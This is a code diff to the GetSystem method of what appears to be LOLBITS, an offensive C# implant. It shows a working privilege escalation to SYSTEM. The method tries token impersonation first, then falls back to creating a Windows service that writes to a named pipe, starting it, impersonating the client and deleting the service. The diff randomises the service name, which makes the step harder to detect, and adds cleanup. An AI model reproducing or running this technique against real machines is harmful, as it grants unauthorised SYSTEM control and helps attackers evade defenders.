@@ -106,23 +106,27 @@ namespace LOLBITS.TokenManagement
         public bool GetSystem(SysCallManager sysCall)
         {
 
-
-            int pid = Utils.getSystemPID(sysCall);
-
-            if (Impersonate(pid, sysCall))
-                return true;
-
+            try
+            {
+                int pid = Utils.getSystemPID(sysCall);
+                if (Impersonate(pid, sysCall))
+                    return true;
+            }
+            catch {}
+ 
             _pipeName = Jobs.RandomString(7);
+
+            string service = Jobs.RandomString(7);
             var exit = false;
             var server = new Thread(ServerThread);
 
-            var cmd = "sc create NewDefaultService2 binpath= \"c:\\windows\\system32\\cmd.exe /C echo data > \\\\.\\pipe\\" + _pipeName + "\"";
+            var cmd = "sc create " + service + " binpath= \"c:\\windows\\system32\\cmd.exe /C echo data > \\\\.\\pipe\\" + _pipeName + "\"";
             Utils.ExecuteCommand(cmd, sysCall);
 
             server.Start();
             Thread.Sleep(250);
 
-            cmd = "sc start NewDefaultService2";
+            cmd = "sc start " + service;
             Utils.ExecuteCommand(cmd, sysCall);
 
             while (!exit)
@@ -131,11 +135,12 @@ namespace LOLBITS.TokenManagement
                     exit = true;
             }
 
+
+            cmd = "sc delete " + service;
+            Utils.ExecuteCommand(cmd, sysCall);
+
             if (_token != IntPtr.Zero)
                 return true;
-
-            cmd = "sc delete NewDefaultService2";
-            Utils.ExecuteCommand(cmd, sysCall);
 
             return false;
         }
